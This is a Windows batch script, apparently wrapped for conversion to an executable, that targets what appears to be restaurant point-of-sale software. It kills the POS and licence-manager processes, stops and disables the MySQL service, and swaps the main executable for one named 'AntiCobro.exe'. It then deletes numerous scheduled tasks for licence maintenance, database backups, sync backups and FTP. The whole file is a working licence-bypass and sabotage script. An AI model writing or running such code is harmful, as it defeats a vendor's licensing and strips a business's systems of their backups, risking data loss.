::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDFbQgWWPWWGIrAP4/z0/9azrUkSaNMqfc/S1KeaIewS+AX0dIQslnJVi98JABhXQgiIYRw1ui5MuSSKNcuVtA71RVqA51hwC2BmiCPAgzgyYt9tiYMN1iO770T7nqEVwkTMV7oaEG6h461rM9wQwSi1fHXKm6dGCrvrZ7TkCjjJMSkciX7XmYxWvII5YBR6cT1CjoZP7iXuRoCv2WUBYWKMmOXnx1c7dJr6fLQKtRy50jhSx6q2mV4AAy1HGl97
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZksaHErTXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlTMbCXrZg==
::ZQ05rAF9IAHYFVzEqQIxJg9XQwbi
::eg0/rx1wNQPfEVWB+kM9LVsJDAWMKGi1BNU=
::fBEirQZwNQPfEVWB+kM9LVsJDAWMKGi1BNU=
::cRolqwZ3JBvQF1fEqQIxJg9XQwbi
::dhA7uBVwLU+EWHSF51Y1OhhYQxGGXA==
::YQ03rBFzNR3SWATE2UMjPB5GTwiNKW/a
::dhAmsQZ3MwfNWATE2UMjPB5GTwiNKW/a
::ZQ0/vhVqMQ3MEVWAtB9wCBFcQwqXLyvyErAQ7e/p7ufOwg==
::Zg8zqx1/OA3MEVWAtB9wCBFcQwqXLyvyErAQ7e/p7ufOwg==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDFbQgWWPWWGIrAP4/z0/9azrUkSaNMqfc/S1KeaIewS+AX0dIQslnJVi98JABhXQgiIYRw1ui5MuSSKNcuVtA71RVqA51hwC2BmiCPAgzgyYt9tiYMN1iO770T7nqEVwkTMV7oaEG6h461rM9wQwSi1fHXKm6dGCrvrZ7TkCjjJMSkciX7XmYxWjYo+SyV4T1hbha1l4iT6UZ2H/nZVFRLrkM/L6mU1ac74Y6ZXjAWypg==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off

taskkill /IM MESA1.exe /F
taskkill /IM mesa_i.exe /F
taskkill /IM LManager.exe /F
sc stop "MySQL5"
sc config "MySQL5" start= disabled
RENAME C:\00RES\MESA1.exe bkme.bk
RENAME C:\00RES\Llave\LManager.exe bkll.bk
RENAME C:\00RES\AntiCobro.exe MESA1.exe
schtasks /DELETE /TN "MANTENIMIENTOLICENCIA" /f
schtasks /DELETE /TN "BKMYSQL" /f
schtasks /DELETE /TN "BKMYSQL2" /f
schtasks /DELETE /TN "BKMYSQL3" /f
schtasks /DELETE /TN "BKMYSQL4" /f
schtasks /DELETE /TN "BKMYSQL5" /f
schtasks /DELETE /TN "BKMYSQL6" /f
schtasks /DELETE /TN "BKMYSQL7" /f
schtasks /DELETE /TN "BKMYSQL8" /f
schtasks /DELETE /TN "BKMYSQL9" /f
schtasks /DELETE /TN "BKMYSQL10" /f
schtasks /DELETE /TN "BKMYSQL11" /f
schtasks /DELETE /TN "SYNCROTPVBKS" /f
schtasks /DELETE /TN "SYNCROTPVBKS2" /f
schtasks /DELETE /TN "SYNCROTPVBKS3" /f
schtasks /DELETE /TN "SYNCROTPVBKS4" /f
schtasks /DELETE /TN "SYNCROTPVBKS5" /f
schtasks /DELETE /TN "SYNCROTPVBKS6" /f
schtasks /DELETE /TN "SYNCROTPVBKS7" /f
schtasks /DELETE /TN "SYNCROTPVBKS8" /f
schtasks /DELETE /TN "SYNCROTPVBKS9" /f
schtasks /DELETE /TN "SYNCROTPVBKS10" /f
schtasks /DELETE /TN "SYNCROTPVBKS11" /f
schtasks /DELETE /TN "CLEANBACKUP" /f
schtasks /DELETE /TN "NOAPAGAN" /f
schtasks /DELETE /TN "FTPSPOFYYREST" /f


exit